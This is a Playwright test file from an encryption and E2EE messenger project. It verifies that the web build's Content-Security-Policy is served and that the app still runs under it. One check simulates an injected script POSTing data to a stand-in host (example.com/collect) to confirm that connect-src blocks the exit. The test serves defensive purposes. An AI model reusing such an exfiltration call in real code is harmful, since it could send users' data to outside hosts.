/*
 * P00RIJA Cryptography — offline-first encryption suite and E2EE messenger.
 * Copyright (C) 2026 Poorija <p00rija@tutamail.com>
 * https://github.com/Poorija/P00RIJA-Cryptography
 *
 * Licensed under the GNU Affero General Public License, version 3 only.
 * See LICENSE for the full text. Section 13 matters here: run a modified
 * version as a network service and its users are entitled to your source.
 */

/* Part of the P00RIJA end-to-end suite. See tests/e2e/README.md.

   The web build shipped without a Content-Security-Policy for its whole life,
   while the native shell had one. That mattered here more than it does in most
   applications: the vault, the attachments and — while the app is open — the
   master password all live in the page, and the page renders text the other
   side of a conversation controls through 159 innerHTML sites.

   A policy does not stop an injection. It takes away the exit: with
   connect-src pinned to this deployment's own origins, a script that does run
   cannot post the vault anywhere.

   Two things are checked, and the second is the one that would actually rot:

     1. The policy is present, and present on the DOCUMENT — nginx discards
        every inherited header the moment a location declares one of its own,
        and index.html is served by a location that does exactly that. The
        policy therefore has to be repeated there, and this is what notices
        when it is not.

     2. The app still works under it. A directive that blocks a worker, a
        blob: URL or the Argon2 WASM breaks the product, not the test, and
        would otherwise only surface after a deployment.                       */

import { chromium } from 'playwright';
import { settle } from './_settle.mjs';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

const URL_BASE = process.env.PKG_URL || 'http://localhost:8123';
const ROOT = fileURLToPath(new URL('../../', import.meta.url));

const results = [];
const check = (n, ok, d = '') => {
  results.push({ n, ok });
  console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${n}${d ? '  — ' + d : ''}`);
};

/* ===== the policy nginx is configured to send ============================ */

console.log('\n===== the committed nginx policy =====');
{
  const conf = readFileSync(`${ROOT}config/nginx.conf`, 'utf8');

  check('nginx defines the policy in one place', /map \$host \$poorija_csp/.test(conf));

  /* Every location that declares an add_header of its own must repeat it,
     because nginx drops the inherited set. Counting them is how this test
     catches a location added later without the header. */
  const locationsWithHeaders = (conf.match(/location[^\n]*\{[^}]*add_header/gs) || []).length;
  const cspHeaders = (conf.match(/add_header Content-Security-Policy/g) || []).length;
  check('every location that overrides headers repeats the policy',
    cspHeaders >= locationsWithHeaders + 1,
    `${cspHeaders} policy headers, ${locationsWithHeaders} overriding locations`);

  const policy = (conf.match(/default \"([^\"]+)\";/) || [])[1] || '';
  const directive = (name) => (policy.match(new RegExp(name + ' ([^;]+)')) || [])[1] || '';

  check('connect-src does not allow arbitrary hosts',
    Boolean(directive('connect-src')) &&
    !/\bhttps:(?!\/\/)/.test(directive('connect-src')) &&
    !/\*/.test(directive('connect-src')),
    directive('connect-src'));
  check('object-src is none', directive('object-src').trim() === "'none'");
  check('base-uri is self', directive('base-uri').trim() === "'self'");
  check('form-action is none', directive('form-action').trim() === "'none'");
  check('frame-ancestors is none', directive('frame-ancestors').trim() === "'none'");
  check('default-src is self', directive('default-src').trim() === "'self'");

  /* Stated as a deliberate exception rather than left implicit: index.html
     carries 276 inline handlers, so dropping 'unsafe-inline' would break the
     interface. If that ever changes, this check should be the thing that
     reminds someone to tighten it. */
  check("script-src still allows inline, which is a known and accepted gap",
    /'unsafe-inline'/.test(directive('script-src')), directive('script-src'));
  check('but it does NOT allow eval',
    !/'unsafe-eval'/.test(directive('script-src')), directive('script-src'));
  check('WASM is allowed, because Argon2 needs it',
    /'wasm-unsafe-eval'/.test(directive('script-src')));
}

/* ===== the policy actually being served ================================== */

console.log('\n===== what the server sends =====');
const browser = await chromium.launch();
const context = await browser.newContext({ ignoreHTTPSErrors: true });
const page = await context.newPage();

const violations = [];
const consoleErrors = [];
page.on('console', (m) => {
  const text = m.text();
  if (/Content Security Policy|Refused to/i.test(text)) violations.push(text.slice(0, 220));
  else if (m.type() === 'error') consoleErrors.push(text.slice(0, 200));
});
page.on('pageerror', (e) => consoleErrors.push('PAGEERROR: ' + e.message.slice(0, 200)));

const headers = {};
page.on('response', (r) => {
  if (r.url().endsWith('/index.html')) Object.assign(headers, r.headers());
});

/* Settle before asserting anything.

   app.js registers a service worker and reloads once when the cache name
   changes. Against a remote server that reload lands late — after a
   waitForFunction has already been satisfied — and destroys the context, so
   every module then reads as undefined and the test reports a broken app that
   is in fact fine. Wait for the document to finish and give the reload its
   chance first. */
await page.goto(`${URL_BASE}/index.html`, { waitUntil: 'load' });
/* Not a fixed wait. The service worker reloads a fresh profile once per
   version, and any evaluate in flight when that lands dies with "Execution
   context was destroyed" — read as a crash, not a failure. Waiting for the
   page to hold still is the property actually wanted. */
await settle(page);
await page.waitForFunction(() => document.readyState === 'complete', null, { timeout: 30000 });
await page.waitForFunction(
  () => typeof window.PoorijaVault?.openVault === 'function', null, { timeout: 30000 });
await page.waitForTimeout(1500);

const served = headers['content-security-policy'] || '';
console.log('  ' + (served ? served.slice(0, 160) + '…' : '(none)'));
check('THE DOCUMENT ITSELF CARRIES A POLICY', served.length > 0, served ? 'present' : 'MISSING');
check('it constrains where the page may connect', /connect-src/.test(served));
check('it blocks plugins and framing',
  /object-src 'none'/.test(served) && /frame-ancestors 'none'/.test(served));

/* ===== and the app still runs under it =================================== */

console.log('\n===== the app under the policy =====');

const alive = await page.evaluate(() => ({
  core: typeof window.PoorijaCryptoCore?.seal === 'function',
  vault: typeof window.PoorijaVault?.createVault === 'function',
  stego: typeof window.PoorijaStego?.hide === 'function',
  chatParts: document.querySelectorAll('script[src*="js/chat/"]').length,
  chatFns: ['renderMessages', 'sendMessage', 'fitGroupCallGrid', 'chatDownloadBlob']
    .filter((n) => typeof window[n] !== 'function')
}));
check('every module loaded', alive.core && alive.vault && alive.stego, JSON.stringify(alive));
check('every chat part loaded', alive.chatParts >= 20, `${alive.chatParts} parts`);
check('the chat functions are there', alive.chatFns.length === 0, alive.chatFns.join(', '));

/* Argon2 is WebAssembly. If 'wasm-unsafe-eval' were missing, the vault would
   fail to open and the app would be unusable — a failure worth testing for
   rather than discovering after a deploy. */
const argon = await page.evaluate(async () => {
  try {
    const t0 = performance.now();
    const p = await window.PoorijaVault.createVault('csp-check-password-1234');
    const reopened = await window.PoorijaVault.openVault('csp-check-password-1234');
    return { ok: reopened?.pid === p.pid, ms: Math.round(performance.now() - t0) };
  } catch (error) { return { ok: false, error: String(error).slice(0, 160) }; }
});
check('the Argon2 WASM runs and the vault opens under the policy',
  argon.ok === true, argon.error || `${argon.ms}ms`);

/* Blob URLs carry every attachment, sticker and voice note. */
const blobs = await page.evaluate(async () => {
  try {
    const url = URL.createObjectURL(new Blob([new Uint8Array([1, 2, 3, 4])]));
    const bytes = new Uint8Array(await (await fetch(url)).arrayBuffer());
    URL.revokeObjectURL(url);
    return { ok: bytes.length === 4 };
  } catch (error) { return { ok: false, error: String(error).slice(0, 160) }; }
});
check('blob: URLs can still be read, so attachments work',
  blobs.ok === true, blobs.error || '4 bytes');

const worker = await page.evaluate(async () => {
  try {
    const url = URL.createObjectURL(new Blob(['self.onmessage=()=>postMessage(1)'],
      { type: 'text/javascript' }));
    const w = new Worker(url);
    const got = await new Promise((resolve) => {
      w.onmessage = (e) => resolve(e.data);
      w.onerror = () => resolve('error');
      w.postMessage(0);
      setTimeout(() => resolve('timeout'), 3000);
    });
    w.terminate();
    return { ok: got === 1, got };
  } catch (error) { return { ok: false, error: String(error).slice(0, 160) }; }
});
check('a blob worker can still start', worker.ok === true,
  worker.error || String(worker.got));

check('the page reported no policy violations',
  violations.length === 0, violations.slice(0, 3).join(' | '));
check('and no script errors', consoleErrors.length === 0, consoleErrors.slice(0, 2).join(' | '));

/* ===== the exit is actually closed ======================================= */

console.log('\n===== what an injected script could not do =====');
const exfil = await page.evaluate(async () => {
  /* The whole point of connect-src: a script that runs in this page must not
     be able to post what it finds somewhere else.

     Asserting only that the fetch throws is not enough — a host that does not
     resolve throws too, so the first version of this check would have passed
     against a page with no policy at all. The securitypolicyviolation event
     fires only for a CSP refusal and names the directive that did it, which is
     the thing actually being claimed. A resolvable host is used so DNS cannot
     be the reason. */
  const seen = [];
  const listener = (e) => seen.push({
    directive: e.effectiveDirective || e.violatedDirective,
    blocked: String(e.blockedURI || '').slice(0, 60)
  });
  document.addEventListener('securitypolicyviolation', listener);
  let threw = false;
  try {
    await fetch('https://example.com/collect', { method: 'POST', mode: 'cors', body: 'x' });
  } catch (error) { threw = true; }
  await new Promise((r) => setTimeout(r, 400));
  document.removeEventListener('securitypolicyviolation', listener);
  return { threw, seen };
});
check('a POST to an unrelated host is refused', exfil.threw === true);
check('AND THE POLICY IS WHAT REFUSED IT, not DNS',
  exfil.seen.some((v) => /connect-src/.test(v.directive || '')),
  JSON.stringify(exfil.seen.slice(0, 2)));

await browser.close();
const bad = results.filter((r) => !r.ok);
console.log(`\n===== ${bad.length} failed of ${results.length} =====`);
process.exit(bad.length ? 1 : 0);
